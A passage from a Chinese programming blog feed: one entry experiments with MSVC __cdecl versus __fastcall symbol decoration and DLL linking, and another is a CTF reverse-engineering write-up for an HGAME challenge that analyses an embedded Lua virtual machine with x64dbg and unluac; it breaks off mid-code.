<p>这篇文章介绍了 MSVC 下各种调用约定。同一种调用约定在不同指令集架构下也是有区别的。<br><a href="https://docs.microsoft.com/en-us/cpp/build/reference/gd-gr-gv-gz-calling-convention?view=msvc-160">https://docs.microsoft.com/en-us/cpp/build/reference/gd-gr-gv-gz-calling-convention?view=msvc-160</a><br>其中有一个 vectorcall 似乎是为了优化而使用的。</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//CdeclCall.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token comment">//__declspec(dllexport) </span>
<span class="token keyword">void</span>  __cdecl <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d , b = %d "</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//FastCall.c</span>
<span class="token function">__declspec</span><span class="token punctuation">(</span>dllimport<span class="token punctuation">)</span> <span class="token keyword">void</span> __fastcall <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>我们先看看 FastCall.c 编译出来的符号是什么形式的。</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cl <span class="token operator">/</span>c CdeclCall<span class="token punctuation">.</span>c
dumpbin <span class="token operator">/</span>SYMBOLS CdeclCall<span class="token punctuation">.</span>obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>以下是结果</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Microsoft <span class="token punctuation">(</span>R<span class="token punctuation">)</span> COFF/PE Dumper Version 14<span class="token punctuation">.</span>28<span class="token punctuation">.</span>29913<span class="token punctuation">.</span>0
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Microsoft Corporation<span class="token punctuation">.</span>  All rights reserved<span class="token punctuation">.</span>


Dump of file CdeclCall<span class="token punctuation">.</span>obj

File <span class="token function">Type</span>: COFF OBJECT

COFF SYMBOL TABLE
000 010474D9 ABS    notype       Static       <span class="token punctuation">|</span> @comp<span class="token punctuation">.</span>id
001 80010191 ABS    notype       Static       <span class="token punctuation">|</span> @feat<span class="token punctuation">.</span>00
002 00000000 SECT1  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>drectve
    Section length   2F<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>
004 00000000 SECT2  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>debug<span class="token variable">$S</span>
    Section length   88<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>
006 00000000 SECT3  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   1A<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum 7C27059A</span>
008 00000000 SECT4  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length    A<span class="token punctuation">,</span> <span class="token comment">#relocs    1, #linenums    0, checksum 71A05264, selection    2 (pick any)</span>
00A 00000000 SECT5  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   29<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum 2B25B17F, selection    2 (pick any)</span>
00C 00000000 SECT6  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   3A<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum CAE6D625, selection    2 (pick any)</span>
00E 00000000 SECT4  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___local_stdio_printf_options
00F 00000000 UNDEF  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___acrt_iob_func
010 00000000 UNDEF  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___stdio_common_vfprintf
011 00000000 SECT5  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> __vfprintf_l
012 00000000 SECT6  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> _printf
013 00000000 SECT3  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> _foo
014 00000008 UNDEF  notype       External     <span class="token punctuation">|</span> ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 <span class="token punctuation">(</span>`__local_stdio_printf_options<span class="token string">'::`2'</span>::_OptionsStorage<span class="token punctuation">)</span>
015 00000000 SECT7  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span><span class="token keyword">data</span>
    Section length   11<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum A358B0F1</span>
017 00000000 SECT7  notype       Static       <span class="token punctuation">|</span> <span class="token variable">$SG9219</span>
018 00000000 SECT8  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>chks64
    Section length   40<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>

String Table Size = 0x90 bytes

  Summary

          40 <span class="token punctuation">.</span>chks64
          11 <span class="token punctuation">.</span><span class="token keyword">data</span>
          88 <span class="token punctuation">.</span>debug<span class="token variable">$S</span>
          2F <span class="token punctuation">.</span>drectve
          87 <span class="token punctuation">.</span>text<span class="token variable">$mn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>可以看见在 MSVC cdecl 下 foo 只是被简单修饰成为了 _foo，</p>
<p>但是当我们用同样的方法去查看 fastcall 修饰的 foo 时，会发现出现了一些变化。</p>
<pre class="line-numbers language-none"><code class="language-none">@foo@8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>很明显这两个不能链接。由此要有一些手动的操作，配置符号。</p>
<pre class="line-numbers language-none"><code class="language-none">LIBRARY CdeclCall
EXPORTS
    foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">cl .\CdeclCall.c &#x2F;LD &#x2F;DEF .\together.def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>最后</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">link <span class="token punctuation">.</span>\FastCall<span class="token punctuation">.</span>obj <span class="token punctuation">.</span>\CdeclCall<span class="token punctuation">.</span>lib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>得到一个神魔玩意儿</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention> D:\Learn_Linker_elf_rtld\call_invention\FastCall<span class="token punctuation">.</span>exe
<span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>执行不了，ida 看看，程序上好像没什么问题，可能原因在动态链接器？<strong>留坑。。。</strong></p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>还有一种显示的动态链接，还没试过，可以尝试一波。</p>
<p>去官网找了一个 显示动态链接的模板，修改后有以下结果。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span>
 
<span class="token comment">//typedef int (__cdecl *MYPROC)(LPWSTR); </span>

<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>MYPROC<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    HINSTANCE hinstLib<span class="token punctuation">;</span> 
    MYPROC foo<span class="token punctuation">;</span> 
    BOOL fFreeResult<span class="token punctuation">,</span> fRunTimeLinkSuccess <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> 
 
    <span class="token comment">// Get a handle to the DLL module.</span>
 
    hinstLib <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"CdeclCall.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
    <span class="token comment">// If the handle is valid, try to get the function address.</span>
 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hinstLib <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span> 
        foo <span class="token operator">=</span> <span class="token punctuation">(</span>MYPROC<span class="token punctuation">)</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hinstLib<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
        <span class="token comment">// If the function address is valid, call the function.</span>
 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">!=</span> foo<span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            fRunTimeLinkSuccess <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
            <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// Free the DLL module.</span>
 
        fFreeResult <span class="token operator">=</span> <span class="token function">FreeLibrary</span><span class="token punctuation">(</span>hinstLib<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 

    <span class="token comment">// If unable to call the DLL function, use an alternative.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> fRunTimeLinkSuccess<span class="token punctuation">)</span> 
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Message printed from executable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>用 together.def CdeclCall.c 编译出 CdeclCall.dll</p>
<p>运行<br>有如下结果</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention> <span class="token punctuation">.</span>\D_FastCall<span class="token punctuation">.</span>exe
a = 608420 <span class="token punctuation">,</span> b = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>预期之中。好像学到了些什么。2333</p>
<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p><strong>留坑。。。</strong></p>
<p>ld 的脚本麻烦一点，不过资料应该多一点。</p>
]]></content>
      <categories>
        <category>call convention</category>
      </categories>
      <tags>
        <tag>MSVC</tag>
        <tag>call convention</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME-FINAL-RE</title>
    <url>/2021/03/21/HGAME_FINAL/</url>
    <content><![CDATA[<h2 id="hgame-final-by-RogerThat"><a href="#hgame-final-by-RogerThat" class="headerlink" title="hgame_final by RogerThat"></a>hgame_final by RogerThat</h2><p> 对于这道题目有好两个思路可以进行，其一是直接进入程序，在逆向过程中会遇到一个接管几乎全部程序的 switch 结构。很典型的直冲直撞逆向手（在没有 hint 的情况下）。</p>
<p>在我这边的环境下这个函数在 sub_7FF6A2994F44</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/virtual_machain.jpg" alt="virtual_machain"></p>
<p>可以看出，这个代码很难看懂，但是可以看出他的分支有 46 种，一般出现这么长的 switch 结构是很有问题的，而且根据我的分析，调用不同的 switch 他会调用函数等等，输出出</p>
<pre class="line-numbers language-none"><code class="language-none">Welcome to HGAME final!

what is your flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>在一开始不知道这个和 lua 的情况下焦头烂额，因为想分析这个虚拟机难度非常高，后来我也只是在源码的帮助下才勉强理解。一开始通过 x64_dbg 自带的条件断点，我让他输出出了 siwtch 的分支。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/switch_case.jpg" alt="switch_case"></p>
<p>具体的 OPCODE 我就不展示了，很长很长，而且大部分都是 case 1。</p>
<p>但是当我知道了它和 lua 有关，那就不一样了，内置的虚拟机必然会去执行 lua 代码，或者 lua 2 luac.out 的字节码。这个代码其实就是在 pe 文件里面，其实 mezone 给的 out 文件多了 debug信息的，反而更容易知道逻辑。</p>
<p>关于我 lua 学习整个过程，我丢在了 mind_strom.md 中了，还挺有纪念价值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/need_dump.jpg" alt="need_dump"></p>
<p>后面还有好多，而且没有 debug 的信息，只好对照着源码去寻找节区。</p>
<p>在 pe 中有这么一串典型的 luac.out 文件，而且可以在 exe 中找到 version 5.3.6 其实这里 mezone 说的 luadec 其实有一点问题，对于没有 debug 信息的 .out 不是很支持，而且配置环境有点麻烦，这里推荐我刚找到的新工具，unluac 支持 5.1 - 5.4 ，<strong>unluac_2021_03_11.jar</strong></p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">java <span class="token operator">-</span>jar <span class="token punctuation">.</span>\unluac_2021_03_11<span class="token punctuation">.</span>jar <span class="token punctuation">.</span>\MyByte<span class="token punctuation">.</span>out > <span class="token punctuation">.</span>\myOut<span class="token punctuation">.</span>lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>生成的 myOut.lua 就先不妨这了，太长了，我放在一个压缩包里面好了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/unluac.jpg" alt="unluac"></p>
<p>不是很好阅读，毕竟没有 “符号文件” “debug 信息”。不过也还好，逻辑也能知道。</p>
<p>知道了这个文件之后会发现有一个加密函数 hgame.enc 。很陌生，我决定分析一下 OPCODE 一探究竟。附件：opcode.txt 很多都是手打的，毕竟要分析虚拟机行为。</p>
<p>关键部分</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;OP_EQ&#125;         in case 31
&#123;OP_MOVE&#125;       in case 0
&#123;OP_LOADK&#125;      in case 1
&#123;OP_CONCAT&#125;     in case 29
&#123;OP_LOADK&#125;      in case 1
&#123;OP_GETTABUP&#125;   in case 6
&#123;OP_LOADK&#125;      in case 1

&#123;OP_GETTABLE&#125;   in case 7
&#123;OP_MOVE&#125;       in case 0
############################# hgame.enc
&#123;OP_CALL&#125;       in case 36
Under CASE 24,I jmp to small case 16
##############################

&#123;OP_NEWTABLE&#125;   in case 11

&#123;OP_LOADK&#125;      in case 1
&#123;OP_LOADK&#125;      in case 1
&#123;OP_LOADK&#125;      in case 1
&#123;OP_FORPREP&#125;    in case 40
&#123;OP_FORLOOP&#125;    in case 39
&#123;OP_LOADK&#125;      in case 1
&#123;OP_SELF&#125;       in case 12
&#123;OP_MOVE&#125;        in case 0
&#123;OP_MOVE&#125;       in case 0
&#123;OP_CALL&#125;        in case 36
Under CASE 24,I jmp to small case 16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span> L2_2 <span class="token operator">~=</span> <span class="token number">64</span> <span class="token keyword">then</span>
  L2_2 <span class="token operator">=</span> print
  L3_2 <span class="token operator">=</span> <span class="token string">"NO!"</span>
  <span class="token function">L2_2</span><span class="token punctuation">(</span>L3_2<span class="token punctuation">)</span>
  <span class="token keyword">return</span>
<span class="token keyword">end</span>
L2_2 <span class="token operator">=</span> L0_2
L3_2 <span class="token operator">=</span> <span class="token string">"0000000000000000"</span>
L0_2 <span class="token operator">=</span> L2_2 <span class="token operator">..</span> L3_2
L2_2 <span class="token operator">=</span> <span class="token string">"hgame"</span>
L2_2 <span class="token operator">=</span> _ENV<span class="token punctuation">[</span>L2_2<span class="token punctuation">]</span>
L3_2 <span class="token operator">=</span> <span class="token string">"enc"</span>
L2_2 <span class="token operator">=</span> L2_2<span class="token punctuation">[</span>L3_2<span class="token punctuation">]</span>
L3_2 <span class="token operator">=</span> L0_2
<span class="token function">L2_2</span><span class="token punctuation">(</span>L3_2<span class="token punctuation">)</span>
L2_2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
L3_2 <span class="token operator">=</span> <span class="token number">1</span>
L4_2 <span class="token operator">=</span> <span class="token number">80</span>
L5_2 <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> L6_2 <span class="token operator">=</span> L3_2<span class="token punctuation">,</span> L4_2<span class="token punctuation">,</span> L5_2 <span class="token keyword">do</span>
  L9_2 <span class="token operator">=</span> <span class="token string">"byte"</span>
  L8_2 <span class="token operator">=</span> L0_2
  <span class="token comment">--......--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>可以对比 unluac 得到的代码，发现 hgame.enc 这个函数脱离了这个虚拟机而运作，加密了之后再进行下去。这里可以看看源码。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">vmcase</span><span class="token punctuation">(</span>OP_CALL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token function">GETARG_B</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> nresults <span class="token operator">=</span> <span class="token function">GETARG_C</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> L<span class="token operator">-></span>top <span class="token operator">=</span> ra<span class="token operator">+</span>b<span class="token punctuation">;</span>  <span class="token comment">/* else previous instruction set top */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">luaD_precall</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> ra<span class="token punctuation">,</span> nresults<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* C function? */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nresults <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>
      L<span class="token operator">-></span>top <span class="token operator">=</span> ci<span class="token operator">-></span>top<span class="token punctuation">;</span>  <span class="token comment">/* adjust results */</span>
    <span class="token function">Protect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* update 'base' */</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* Lua function */</span>
    ci <span class="token operator">=</span> L<span class="token operator">-></span>ci<span class="token punctuation">;</span>
    <span class="token keyword">goto</span> newframe<span class="token punctuation">;</span>  <span class="token comment">/* restart luaV_execute over new Lua function */</span>
  <span class="token punctuation">&#125;</span>
  vmbreak<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>他会分析这个要调用的函数是否是 lua 程序 或者 C 程序，而如果是 lua 程序的话，下一步就是进入一个 所谓 newframe ，其实就是新的一个虚拟机。</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">void <span class="token function">luaV_execute</span> <span class="token punctuation">(</span>lua_State <span class="token operator">*</span>L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  CallInfo <span class="token operator">*</span>ci <span class="token operator">=</span> L<span class="token operator">-</span><span class="token operator">></span>ci<span class="token punctuation">;</span>
  LClosure <span class="token operator">*</span>cl<span class="token punctuation">;</span>
  TValue <span class="token operator">*</span>k<span class="token punctuation">;</span>
  StkId base<span class="token punctuation">;</span>
  ci<span class="token operator">-</span><span class="token operator">></span>callstatus <span class="token operator">|</span><span class="token operator">=</span> CIST_FRESH<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> fresh invocation of 'luaV_execute" <span class="token operator">*</span><span class="token operator">/</span>
<span class="token comment">------------------------------important----------------------------</span>
 newframe<span class="token punctuation">:</span>  <span class="token operator">/</span><span class="token operator">*</span> reentry point when frame <span class="token function">changes</span> <span class="token punctuation">(</span>call<span class="token operator">/</span><span class="token keyword">return</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">/</span>
<span class="token comment">--------------------------------------------------------------------</span>
  <span class="token function">lua_assert</span><span class="token punctuation">(</span>ci <span class="token operator">==</span> L<span class="token operator">-</span><span class="token operator">></span>ci<span class="token punctuation">)</span><span class="token punctuation">;</span>
  cl <span class="token operator">=</span> <span class="token function">clLvalue</span><span class="token punctuation">(</span>ci<span class="token operator">-</span><span class="token operator">></span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> reference to <span class="token keyword">function</span>'s closure <span class="token operator">*</span><span class="token operator">/</span>
  k <span class="token operator">=</span> cl<span class="token operator">-</span><span class="token operator">></span>p<span class="token operator">-</span><span class="token operator">></span>k<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> reference to <span class="token keyword">function</span>'s constant table <span class="token operator">*</span><span class="token operator">/</span>
  base <span class="token operator">=</span> ci<span class="token operator">-</span><span class="token operator">></span>u<span class="token punctuation">.</span>l<span class="token punctuation">.</span>base<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> copy of <span class="token keyword">function</span>'s base <span class="token operator">*</span><span class="token operator">/</span>
  <span class="token operator">/</span><span class="token operator">*</span> main loop of interpreter <span class="token operator">*</span><span class="token operator">/</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Instruction i<span class="token punctuation">;</span>
    StkId ra<span class="token punctuation">;</span>
    <span class="token function">vmfetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">vmdispatch</span> <span class="token punctuation">(</span><span class="token function">GET_OPCODE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">--.....--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由此可见这不是一个 lua 程序，我们应该去寻找一个 C function。为了寻找这个，我的设想是在 存储着我的字符串的地方下断，而这个就涉及 lua 的寄存器 Table TValue 等结构的存储。</p>
<p>尝试一下。我下断点下在 OP_GETTABLE 也就是 case 7，他的下一步就是 OP_MOVE 再下一步就是 OP_CALL 调用 hgame.enc 函数，通过这个 OP_GETTABLE 我能得到他的 input 的结构，因为 OP_MOVE 在装载参数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">vmcase</span><span class="token punctuation">(</span>OP_GETTABLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    StkId rb <span class="token operator">=</span> <span class="token function">RB</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    TValue <span class="token operator">*</span>rc <span class="token operator">=</span> <span class="token function">RKC</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gettableProtected</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> rb<span class="token punctuation">,</span> rc<span class="token punctuation">,</span> ra<span class="token punctuation">)</span><span class="token punctuation">;</span>
    vmbreak<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
###########################
<span class="token keyword">typedef</span> <span class="token keyword">union</span> Value <span class="token punctuation">&#123;</span>
  GCObject <span class="token operator">*</span>gc<span class="token punctuation">;</span>    <span class="token comment">/* collectable objects */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>         <span class="token comment">/* light userdata */</span>
  <span class="token keyword">int</span> b<span class="token punctuation">;</span>           <span class="token comment">/* booleans */</span>
  lua_CFunction f<span class="token punctuation">;</span> <span class="token comment">/* light C functions */</span>
  lua_Integer i<span class="token punctuation">;</span>   <span class="token comment">/* integer numbers */</span>
  lua_Number n<span class="token punctuation">;</span>    <span class="token comment">/* float numbers */</span>
<span class="token punctuation">&#125;</span> Value<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TValuefields</span>	<span class="token expression">Value value_<span class="token punctuation">;</span> <span class="token keyword">int</span> tt_</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">lua_TValue</span> <span class="token punctuation">&#123;</span>
  TValuefields<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> TValue<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">7u</span><span class="token operator">:</span>
  v71 <span class="token operator">=</span> <span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">+</span> v55<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">+</span> v54<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
